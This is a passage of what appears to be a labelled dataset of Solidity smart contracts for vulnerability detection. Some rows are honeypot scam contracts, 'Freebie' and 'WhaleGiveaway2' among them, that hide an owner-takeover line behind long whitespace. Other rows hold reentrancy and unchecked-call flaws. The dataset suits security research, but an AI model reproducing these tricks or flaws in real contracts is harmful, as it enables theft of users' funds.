_id,name,code,label

            msg.sender.transfer(this.balance);

        }                                                                                                                

    }

    

    function withdraw()

    payable

    public

    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x0C76802158F13aBa9D892EE066233827424c5aAB){Owner=0x0C76802158F13aBa9D892EE066233827424c5aAB;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  

        require(msg.sender == Owner);

        Owner.transfer(this.balance);

    }

    

    function Command(address adr,bytes data)

    payable

    public

    {

        require(msg.sender == Owner);

         
        adr.call.value(msg.value)(data);

    }

}",0000000100000000000000000
10071,0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87," 



pragma solidity ^0.4.19;



contract Freebie

{

    address public Owner = msg.sender;

   

    function() public payable{}

   

    function GetFreebie()

    public

    payable

    {                                                                    

        if(msg.value>1 ether)

        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);

            msg.sender.transfer(this.balance);

        }                                                                                                                

    }

    

    function withdraw()

    payable

    public

    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;}

        require(msg.sender == Owner);

        Owner.transfer(this.balance);

    }

    

    function Command(address adr,bytes data)

    payable

    public

    {

        require(msg.sender == Owner);

         
        adr.call.value(msg.value)(data);

    }

}",0000000100000000000000000
10072,0xe894d54dca59cb53fe9cbc5155093605c7068220," 



pragma solidity ^0.4.24;

 

contract airDrop{

    

    function transfer(address from,address caddress,address[] _tos,uint v, uint _decimals)public returns (bool){

        require(_tos.length > 0);

        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));

        uint _value = v * 10 ** _decimals;

        for(uint i=0;i<_tos.length;i++){

             
            caddress.call(id,from,_tos[i],_value);

        }

        return true;

    }

}",0100000000000000000001000
10073,0xec329ffc97d75fe03428ae155fc7793431487f63," 



pragma solidity >=0.4.11;



contract Owned {

    function Owned() {

        owner = msg.sender;

    }



    address public owner;



     
     
     
    modifier onlyOwner { if (msg.sender == owner) _; }



    function changeOwner(address _newOwner) onlyOwner {

        owner = _newOwner;

    }



     
     
     
    function execute(address _dst, uint _value, bytes _data) onlyOwner {

         
        _dst.call.value(_value)(_data);

    }

}

 
contract Token {

    function transfer(address, uint) returns(bool);

    function balanceOf(address) constant returns (uint);

}



contract TokenSender is Owned {

    Token public token;  
    uint public totalToDistribute;



    uint public next;





    struct Transfer {

        address addr;

        uint amount;

    }



    Transfer[] public transfers;



    function TokenSender(address _token) {

        token = Token(_token);

    }



     
    uint constant D160 = 0x0010000000000000000000000000000000000000000;



     
     
     
     
     
     
    function fill(uint[] data) onlyOwner {



         
        if (next>0) throw;



        uint acc;

        uint offset = transfers.length;

        transfers.length = transfers.length + data.length;

        for (uint i = 0; i < data.length; i++ ) {

            address addr = address( data[i] & (D160-1) );

            uint amount = data[i] / D160;



            transfers[offset + i].addr = addr;

            transfers[offset + i].amount = amount;

            acc += amount;

        }

        totalToDistribute += acc;

    }

     
     
     
    function run() onlyOwner {

        if (transfers.length == 0) return;



         
        uint mNext = next;



         
        next = transfers.length;



        if ((mNext == 0 ) && ( token.balanceOf(this) != totalToDistribute)) throw;



        while ((mNext<transfers.length) && ( gas() > 150000 )) {

            uint amount = transfers[mNext].amount;

            address addr = transfers[mNext].addr;

            if (amount > 0) {

                if (!token.transfer(addr, transfers[mNext].amount)) throw;

            }

            mNext ++;

        }



         
        next = mNext;

    }





     
     
     


    function hasTerminated() constant returns (bool) {

        if (transfers.length == 0) return false;

        if (next < transfers.length) return false;

        return true;

    }



    function nTransfers() constant returns (uint) {

        return transfers.length;

    }



    function gas() internal constant returns (uint _gas) {

        assembly {

            _gas:= gas

        }

    }



}",1100000000000000001011000
10074,0xf015c35649c82f5467c9c74b7f28ee67665aad68," 



pragma solidity ^0.4.25;



contract MY_BANK

{

    function Put(uint _unlockTime)

    public

    payable

    {

        var acc = Acc[msg.sender];

        acc.balance += msg.value;

        acc.unlockTime = _unlockTime>now?_unlockTime:now;

        LogFile.AddMessage(msg.sender,msg.value,""Put"");

    }



    function Collect(uint _am)

    public

    payable

    {

        var acc = Acc[msg.sender];

        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)

        {

             
            if(msg.sender.call.value(_am)())

            {

                acc.balance-=_am;

                LogFile.AddMessage(msg.sender,_am,""Collect"");

            }

        }

    }



    function() 

    public 

    payable

    {

        Put(0);

    }



    struct Holder   

    {

        uint unlockTime;

        uint balance;

    }



    mapping (address => Holder) public Acc;



    Log LogFile;



    uint public MinSum = 1 ether;    



    function MY_BANK(address log) public{

        LogFile = Log(log);

    }

}





contract Log 

{

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }



    Message[] public History;



    Message LastMsg;



    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000000000000
10075,0xf2570186500a46986f3139f65afedc2afe4f445d," 



pragma solidity ^0.4.16;



contract RealOldFuckMaker {

    address fuck = 0xc63e7b1DEcE63A77eD7E4Aeef5efb3b05C81438D;

    

     
     
    function makeOldFucks(uint32 number) {

        uint32 i;

        for (i = 0; i < number; i++) {

             
            fuck.call(bytes4(sha3(""giveBlockReward()"")));

        }

    }

}",0000000100000000000010000
10076,0xf29ebe930a539a60279ace72c707cba851a57707," 



pragma solidity ^0.4.24;





contract B {

    address public owner = msg.sender;

    

    function go() public payable {

        address target = 0xC8A60C51967F4022BF9424C337e9c6F0bD220E1C;

         
        target.call.value(msg.value)();

        owner.transfer(address(this).balance);

    }

    

    function() public payable {

    }

}",0001000100000000000000000
10077,0xf70d589d76eebdd7c12cc5eec99f8f6fa4233b9e," 



pragma solidity ^0.4.19;



contract WhaleGiveaway2

{

    address public Owner = msg.sender;

   

    function()

    public

    payable

    {

        

    }

   

    function GetFreebie()

    public

    payable

    {                                                                    

        if(msg.value>1 ether)

        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           

            msg.sender.transfer(this.balance);

        }                                                                                                                

    }

    

    function withdraw()

    payable

    public

    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  

        require(msg.sender == Owner);

        Owner.transfer(this.balance);

    }

    

    function Command(address adr,bytes data)

    payable

    public

    {

        require(msg.sender == Owner);

         
        adr.call.value(msg.value)(data);

    }

}",0000000100000000000000000
10078,1_Deprecated_MarketPlace,"pragma solidity ^0.4.18;





import ""./MarketPlaceInterface.sol"";





contract IERC20 {

  function balanceOf(address who) public constant returns (uint256);

  function transfer(address to, uint256 value) public returns (bool);

  function allowance(address owner, address spender) public constant returns (uint256);

  function transferFrom(address from, address to, uint256 value) public returns (bool);

  function approve(address spender, uint256 value) public returns (bool);

  function getTest() public view returns (address);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);

}

 
 
 
 
 
 
 




contract MarketPlace is MarketPlaceInterface

{

	 



	 

	struct DataSource{

		bytes32 name;

		uint monthlyPrice;

		address owner;

		bool isData;

	}

	 

	struct DataProvider{

		address owner;

		bool isProvider;

		DataSource[] sourcesList;

		mapping(bytes32=>DataSource) sourcesMap;

	}

	 

	struct SubscribedDataSource{

		DataSource dataSource;

		uint startTime;

		uint endTime;

	}

	 

	struct Subscriber{

		address subscriber;

		bool isSubscriber;

		SubscribedDataSource[] sourcesList;

		mapping(bytes32=>SubscribedDataSource) sourcesMap;

	}

	 

	

	 
	IERC20 public mToken;

	 
	uint public mFixedSubscriptionPeriod;

	 
	mapping(address => DataProvider) mDataProviders;

	 
	mapping(address => Subscriber) mSubscribers;

	 
	mapping(bytes32 => address) mNameMap;



	 

	bytes32 testBytes;

	bool testChanged ;



	function MarketPlace(address _tokenAddress, uint _fixedSubscriptionPeriod) public 

	{

		testChanged = false;

		mFixedSubscriptionPeriod = _fixedSubscriptionPeriod;

		mToken = IERC20(_tokenAddress);

	}



	function subscribe(bytes32 _dataSourceName) 

	public 

	dataSourceNameExist(_dataSourceName) 

	returns (bool)

	{



		string memory testData = ""Enterd function subscribe"";

		TestLog(msg.sender,msg.sender, testData);

		 
		address providerAddress = mNameMap[_dataSourceName];

		require(!isNewProvider(providerAddress));

		DataSource ds = mDataProviders[providerAddress].sourcesMap[_dataSourceName];

		require(ds.isData);

		SubscribedDataSource storage sds;

		require(safeTransfer(msg.sender,providerAddress,ds.monthlyPrice));

		

		 
		sds.dataSource = ds;

		sds.startTime = now; 

		sds.endTime = now + mFixedSubscriptionPeriod;



		if(isNewSubscriber(msg.sender))

		{

			Subscriber subscriber;

			subscriber.subscriber = msg.sender;

			subscriber.isSubscriber = true;

			subscriber.sourcesList.push(sds);

			subscriber.sourcesMap[_dataSourceName] = sds;		

			mSubscribers[msg.sender] = subscriber;

		}

		else

		{

			mSubscribers[msg.sender].sourcesList.push(sds);

			mSubscribers[msg.sender].sourcesMap[_dataSourceName] = sds;

		}

		Subscribed(msg.sender,_dataSourceName, providerAddress, ds.monthlyPrice, true);

		return true;

	}

	function register(bytes32 _dataSourceName, uint _price, address _dataOwner) 

	public 

	validPrice(_price)

	uniqueDataSourceName(_dataSourceName) 

	returns (bool)

	{

				 
		testBytes = _dataSourceName;

		testChanged = true;

		require(_dataOwner != address(0));



		 
		mNameMap[_dataSourceName] = _dataOwner;	

		DataSource storage ds;

		ds.name = _dataSourceName;

		ds.monthlyPrice = _price;

		ds.owner = _dataOwner;

		ds.isData = true;



		if(isNewProvider(_dataOwner))  
		{

			 
			DataProvider storage dp;

			dp.owner = _dataOwner;

			dp.isProvider = true;

			dp.sourcesList.push(ds);

			dp.sourcesMap[_dataSourceName] = ds;

			mDataProviders[_dataOwner] = dp;

		}

		else  
		{

			mDataProviders[_dataOwner].sourcesList.push(ds);

			mDataProviders[_dataOwner].sourcesMap[_dataSourceName] = ds;

		}

		Registered(_dataOwner, _dataSourceName, _price, true);

		return true;

	}



	function checkAddressSubscription(address _subscriber, bytes32 _dataSourceName) public returns (bool)

	{

		require(_subscriber != address(0));

		return true;

	}



	function getOwnerFromName(bytes32 _dataSourceName) public view returns(address)

	{

		return mNameMap[_dataSourceName];

	}

	function getDataSource(bytes32 _dataSourceName) public view returns(address,bytes32,bool)

	{

		address owner = mNameMap[_dataSourceName];

		return (owner,testBytes,testChanged);

	}

	 

	function isNewProvider(address _testProvider) internal view returns (bool)

	{

		if(mDataProviders[_testProvider].isProvider)

			return false;

		else

			return true;

	}

	function isNewSubscriber(address _testSubscriber) internal view returns (bool)

	{

		if(mSubscribers[_testSubscriber].isSubscriber)

			return false;

		else

			return true;

	}

	function safeTransfer(address _from, address _to, uint256 _amount) internal returns (bool){

		require(address(_from) != 0 && address(_to)!=0);

		require(mToken.allowance(_from,address(this)) >= _amount);

		require(mToken.transferFrom(_from,_to,_amount));

		SubscriptionPaid(_from, _to, _amount);

		return true;

	}

	 

	modifier uniqueDataSourceName(bytes32 _testName)

	{

		require(mNameMap[_testName]==0);

		_;

	}

	modifier validPrice(uint _testPrice)

	{

		require(_testPrice>=0);

		_;

	}

	modifier dataSourceNameExist(bytes32 _testName)

	{

		require(mNameMap[_testName] != 0);

		_;

	}

	 

	function getTest() public view returns (address){

		return mToken.getTest();

	}

	function balanceOf(address who) public constant returns (uint256){

		return mToken.balanceOf(who);

	}

	function transfer(address to, uint256 value) public returns (bool){

		return mToken.transfer(to,value);

	}



}",0000000000000000000010000
10079,1_Deprecated_Marketplace_interface,"pragma solidity ^0.4.18;



contract MarketPlaceInterface 

{

	function subscribe(bytes32 _dataSourceName) public returns (bool);

	function register(bytes32 _dataSourceName, uint _price, address _dataOwner) public returns (bool);

	function checkAddressSubscription(address _subscriber, bytes32 _dataSourceName) public view returns (address,bytes32,uint,uint,uint);

	

	event Subscribed(address indexed subscriber,bytes32 indexed dataSourceName, address indexed dataOwner, uint price, bool success);

	event Registered(address indexed dataOwner, bytes32 indexed dataSourceName, uint price, bool success);

	event SubscriptionPaid(address indexed from, address indexed to, uint256 value);

	event PriceUpdate(address indexed editor, bytes32 indexed dataSourceName, uint256 newPrice);

	event ActivityUpdate(address indexed editor, bytes32 indexed dataSourceName, bool newStatus);

	 

	event TestLog(address addr1,address addr2, string data);

}",0000000000000000000000000
10080,A,"pragma solidity ^0.5.8;



contract A {

  uint256 a;



  constructor(uint256 _a) public {

    a = _a;

  }

}",0000000000000000000000000
10081,AB,"pragma solidity ^0.5.8;



contract AB {

  uint256 a;

  int256 b;



  uint256 fund;



  constructor(uint256 _a, int256 _b) public {

    a = _a;

    b = _b;

  }



  function burnFund() public payable {

    fund += msg.value;

  }



  function getBurnedFund() public view returns(uint256) {

    return fund;

  }



  function setA(uint256 _a) public {

    a = _a;

  }



  function setB(int256 _b) public {

    b = _b;

  }



  function setAB(uint256 _a, int256 _b) public {

    a = _a;

    b = _b;

  }



  function getA() public view returns(uint256) {

    return a;

  }



  function getB() public view returns(int256) {

    return b;

  }



  function getAB() public view returns(uint256, int256) {

    return (a, b);

  }

}",0000000000010000000100000
10082,AbiGenDummy," 



pragma experimental ABIEncoderV2;



pragma solidity ^0.5.5;





contract AbiGenDummy

{



    uint256 constant internal SOME_CONSTANT = 1234;

    string constant internal REVERT_REASON = ""REVERT_WITH_CONSTANT"";

    string constant internal REQUIRE_REASON = ""REQUIRE_WITH_CONSTANT"";



    function simplePureFunction ()

        public

        pure

        returns (uint256 result)

    {

        return 1;

    }



    function simplePureFunctionWithInput (uint256 x)

        public

        pure

        returns (uint256 sum)

    {

        return 1 + x;

    }



    function pureFunctionWithConstant ()

        public

        pure

        returns (uint256 someConstant)

    {

        return SOME_CONSTANT;

    }



    function simpleRevert ()

        public

        pure

    {

        revert(""SIMPLE_REVERT"");

    }



    function revertWithConstant ()

        public

        pure

    {

        revert(REVERT_REASON);

    }



    function simpleRequire ()

        public

        pure

    {

        require(0 > 1, ""SIMPLE_REQUIRE"");

    }



    function requireWithConstant ()

        public

        pure

    {

        require(0 > 1, REQUIRE_REASON);

    }



     
     
     
     
     
     
     
    function ecrecoverFn(bytes32 hash, uint8 v, bytes32 r, bytes32 s)

        public

        pure

        returns (address signerAddress)

    {

        bytes memory prefix = ""\x19Ethereum Signed Message:\n32"";

        bytes32 prefixedHash = keccak256(abi.encodePacked(prefix, hash));

        return ecrecover(prefixedHash, v, r, s);

    }



     
     
    function withAddressInput(address x, uint256 a, uint256 b, address y, uint256 c)

        public

        pure

        returns (address z)

    {

        return x;

    }



    function acceptsBytes(bytes memory a) public pure {}



     
     
    function acceptsAnArrayOfBytes(bytes[] memory a) public pure {}



    struct Struct {

        bytes someBytes;

        uint32 anInteger;

        bytes[] aDynamicArrayOfBytes;

        string aString;

    }



    function structInput(Struct memory s) public pure {}



     
     
    function structOutput() public pure returns(Struct memory s) {

        bytes[] memory byteArray = new bytes[](2);

        byteArray[0] = ""0x123"";

        byteArray[1] = ""0x321"";



        return Struct({

            someBytes: ""0x123"",

            anInteger: 5,

            aDynamicArrayOfBytes: byteArray,

            aString: ""abc""

        });

    }



    function methodReturningArrayOfStructs() public pure returns(Struct[] memory) {}



    struct NestedStruct {

        Struct innerStruct;

        string description;

    }



    function nestedStructInput(NestedStruct memory n) public pure {}

    function nestedStructOutput() public pure returns(NestedStruct memory) {}



    struct StructNotDirectlyUsedAnywhere {

        uint256 aField;

    }



    struct NestedStructWithInnerStructNotUsedElsewhere {

        StructNotDirectlyUsedAnywhere innerStruct;

    }



    function methodUsingNestedStructWithInnerStructNotUsedElsewhere()

        public pure returns(NestedStructWithInnerStructNotUsedElsewhere  memory)

    {}



    uint someState;

    function nonPureMethod() public returns(uint) { return someState += 1; }

    function nonPureMethodThatReturnsNothing() public { someState += 1; }



    function methodReturningMultipleValues()

        public pure returns (uint256, string memory)

    {

        return (1, ""hello"");

    }



    function overloadedMethod(int a) public pure {}

    function overloadedMethod(string memory a) public pure {}





    event Withdrawal(address indexed _owner, uint _value);



    function withdraw(uint wad) public {

        emit Withdrawal(msg.sender, wad);

    }



    event SimpleEvent(bytes someBytes, string someString);



    function emitSimpleEvent() public {

        emit SimpleEvent(

            hex'12345678',

            ""lorem""

        );

    }



     
     
    struct ComplexInput {

        uint256 foo;

        bytes bar;

        string car;

    }



     
    struct ComplexOutput {

        ComplexInput input;

        bytes lorem;

        bytes ipsum;

        string dolor;

    }



     
    function noInputNoOutput()

        public

        pure

    {

         
        require(true == true);

    }



     
    function noInputSimpleOutput()

        public

        pure

        returns (uint256)

    {

        return 1991;

    }



     
    function simpleInputNoOutput(uint256)

        public

        pure

    {

         
        require(true == true);

    }



     
    function simpleInputSimpleOutput(uint256)

        public

        pure

        returns (uint256)

    {

        return 1991;

    }



     
    function complexInputComplexOutput(ComplexInput memory complexInput)

        public

        pure

        returns (ComplexOutput memory)

    {

        return ComplexOutput({

            input: complexInput,

            lorem: hex'12345678',

            ipsum: hex'87654321',

            dolor: ""amet""

        });

    }



     
    function multiInputMultiOutput(

        uint256,

        bytes memory,

        string memory

    )

        public

        pure

        returns (

            bytes memory,

            bytes memory,

            string memory

        )

    {

        return (

            hex'12345678',

            hex'87654321',

            ""amet""

        );

    }



     
}

",0000000000000000000100000
10083,ABL,"pragma solidity ^0.4.19;





contract OwnableToken {

    mapping (address => bool) owners;



    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    event OwnershipExtended(address indexed host, address indexed guest);



    modifier onlyOwner() {

        require(owners[msg.sender]);

        _;

    }



    constructor() public {

        owners[msg.sender] = true;

    }



    function addOwner(address guest) public onlyOwner {

        require(guest != address(0));

        owners[guest] = true;

        emit OwnershipExtended(msg.sender, guest);

    }



    function transferOwnership(address newOwner) public onlyOwner {

        require(newOwner != address(0));

        owners[newOwner] = true;

        delete owners[msg.sender];

        emit OwnershipTransferred(msg.sender, newOwner);

    }

}





 

library SafeMath {



     

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {

            return 0;

        }

        uint256 c = a * b;

        assert(c / a == b);

        return c;

    }



     

    function div(uint256 a, uint256 b) internal pure returns (uint256) {

         
        uint256 c = a / b;

         
        return c;

    }



     

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        assert(b <= a);

        return a - b;

    }



     

    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;

        assert(c >= a);

        return c;

    }

}





 

contract ERC20Basic {

    function totalSupply() public view returns (uint256);

    function balanceOf(address who) public view returns (uint256);

    function transfer(address to, uint256 value) public returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

}





 

contract BasicToken is ERC20Basic {

    using SafeMath for uint256;



    mapping(address => uint256) balances;



    uint256 totalSupply_;



     

    function totalSupply() public view returns (uint256) {

        return totalSupply_;

    }



     

    function transfer(address _to, uint256 _value) public returns (bool) {

        require(_to != address(0));

        require(_value <= balances[msg.sender]);



         
        balances[msg.sender] = balances[msg.sender].sub(_value);

        balances[_to] = balances[_to].add(_value);

        emit Transfer(msg.sender, _to, _value);

        return true;

    }



     

    function balanceOf(address _owner) public view returns (uint256 balance) {

        return balances[_owner];

    }



}





 

contract ERC20 is ERC20Basic {

    function allowance(address owner, address spender) public view returns (uint256);

    function transferFrom(address from, address to, uint256 value) public returns (bool);

    function approve(address spender, uint256 value) public returns (bool);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}





 

contract StandardToken is ERC20, BasicToken {

    mapping (address => mapping (address => uint256)) internal allowed;





     

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {

        require(_to != address(0));

        require(_value <= balances[_from]);

        require(_value <= allowed[_from][msg.sender]);



        balances[_from] = balances[_from].sub(_value);

        balances[_to] = balances[_to].add(_value);

        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);

        emit Transfer(_from, _to, _value);

        return true;

    }



     

    function approve(address _spender, uint256 _value) public returns (bool) {

        allowed[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }



     

    function allowance(address _owner, address _spender) public view returns (uint256) {

        return allowed[_owner][_spender];

    }



     

    function increaseApproval(address _spender, uint _addedValue) public returns (bool) {

        allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);

        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);

        return true;

    }



     

    function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {

        uint oldValue = allowed[msg.sender][_spender];

        if (_subtractedValue > oldValue) {

            allowed[msg.sender][_spender] = 0;

        } else {

            allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);

        }

        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);

        return true;

    }

}





contract ABL is StandardToken, OwnableToken {

    using SafeMath for uint256;



     
    uint256 public constant SUM = 400000000;    
    uint256 public constant DISTRIBUTION = 221450000;  
    uint256 public constant DEVELOPERS = 178550000;    


     
    string public constant name = ""Airbloc"";

    string public constant symbol = ""ABL"";

    uint256 public constant decimals = 18;

    uint256 public totalSupply = SUM.mul(10 ** uint256(decimals));



     
     
    bool isTransferable = false;



    constructor(

        address _dtb,

        address _dev

    ) public {

        require(_dtb != address(0));

        require(_dev != address(0));

        require(DISTRIBUTION + DEVELOPERS == SUM);



        balances[_dtb] = DISTRIBUTION.mul(10 ** uint256(decimals));

        emit Transfer(address(0), _dtb, balances[_dtb]);



        balances[_dev] = DEVELOPERS.mul(10 ** uint256(decimals));

        emit Transfer(address(0), _dev, balances[_dev]);

    }



    function unlock() external onlyOwner {

        isTransferable = true;

    }



    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {

        require(isTransferable || owners[msg.sender]);

        return super.transferFrom(_from, _to, _value);

    }



    function transfer(address _to, uint256 _value) public returns (bool) {

        require(isTransferable || owners[msg.sender]);

        return super.transfer(_to, _value);

    }



     
     
     
    function mint(

        address _to,

        uint256 _amount

    ) onlyOwner public returns (bool) {

        require(_to != address(0));

        require(_amount >= 0);



        totalSupply = totalSupply.add(_amount);

        balances[_to] = balances[_to].add(_amount);



        emit Mint(_to, _amount);

        emit Transfer(address(0), _to, _amount);



        return true;

    }



    function burn(

        uint256 _amount

    ) onlyOwner public {

        require(_amount >= 0);

        require(_amount <= balances[msg.sender]);



        totalSupply = totalSupply.sub(_amount);

        balances[msg.sender] = balances[msg.sender].sub(_amount);



        emit Burn(msg.sender, _amount);

        emit Transfer(msg.sender, address(0), _amount);

    }



    event Mint(address indexed _to, uint256 _amount);

    event Burn(address indexed _from, uint256 _amount);

}

",0000000000000000000000000
10084,AbstractDAO," 
contract DAO {

    function calcBaseFee(address sender, uint tokenCount) returns (uint fee);

    function calcBaseFeeForShares(address sender, uint shareCount) returns (uint fee);

}

",0000000000000000000000000
10085,AbstractDAOAuction," 
contract DAOAuction {

    function tokenLaunched() returns (bool launched);

}

",0000000000000000000000000
10086,AbstractERC20,"pragma solidity >=0.6.0;



import ""./IERC20.sol"";



library AbstractERC20 {



    function abstractReceive(IERC20 token, uint256 amount) internal returns(uint256) {

        if (token == IERC20(0)) {

            require(msg.value == amount);

            return amount;

        } else {

            uint256 balance = abstractBalanceOf(token, address(this));

            token.transferFrom(msg.sender, address(this), amount);

            uint256 cmp_amount = abstractBalanceOf(token, address(this)) - balance;

            require(cmp_amount != 0);

            return cmp_amount;

        }

    }



    function abstractTransfer(IERC20 token, address to, uint256 amount) internal returns(uint256) {

        if (token == IERC20(0)) {

            payable(to).transfer(amount);

            return amount;

        } else {

            uint256 balance = abstractBalanceOf(token, address(this));

            token.transfer(to, amount);

            uint256 cmp_amount = balance - abstractBalanceOf(token, address(this));

            require(cmp_amount != 0);

            return cmp_amount;

        }

    }



    function abstractBalanceOf(IERC20 token, address who) internal view returns (uint256) {

        if (token == IERC20(0)) {

            return who.balance;

        } else {

            return token.balanceOf(who);

        }

    }

}",0000000000000000000000000
10087,AbstractEventFactory," 
contract EventFactory {

    function createEvent(bytes32 descriptionHash, bool isRanged, int lowerBound, int upperBound, uint8 outcomeCount, address oracleAddress, address tokenAddress, bytes32[] data) returns (bytes32 eventHash);

    function buyAllOutcomes(bytes32 eventHash, uint shareCount);

    function sellAllOutcomes(bytes32 eventHash, uint shareCount);

    function redeemWinnings(bytes32 eventHash) returns (uint winnings);

    function changeDAO(address _shareholderContractAddress);

    function permitPermanentApproval(address spender);

    function revokePermanentApproval(address spender);



    function calcBaseFee(uint tokenCount) constant returns (uint fee);

    function calcBaseFeeForShares(uint shareCount) constant returns (uint fee);

    function isPermanentlyApproved(address owner, address spender) constant returns (bool isApproved);

    function getDAO() constant returns (address daoAddress);
